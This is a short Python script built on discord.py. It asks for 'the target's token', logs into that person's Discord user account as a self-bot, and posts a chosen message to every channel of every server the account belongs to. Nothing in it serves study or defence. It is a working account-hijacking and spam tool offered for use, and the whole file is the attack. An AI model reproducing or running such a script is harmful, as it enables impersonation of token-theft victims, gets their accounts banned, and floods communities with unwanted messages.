import discord
from discord.ext import commands
from discord import Intents

bot = commands.Bot(command_prefix="-", self_bot=True, intents=Intents.all())
token = input("Enter the target's token ")

send_message = "Your message you want to be sent here"

@bot.event
async def on_ready():
    print("Active")
    for guild in bot.guilds:
        for channel in guild.channels:
            try:
                await channel.send(send_message)
                print(f"Sent to {channel.name}")
            except:
                print(f"Couldn't send message to {channel}")


bot.run(token, bot=False)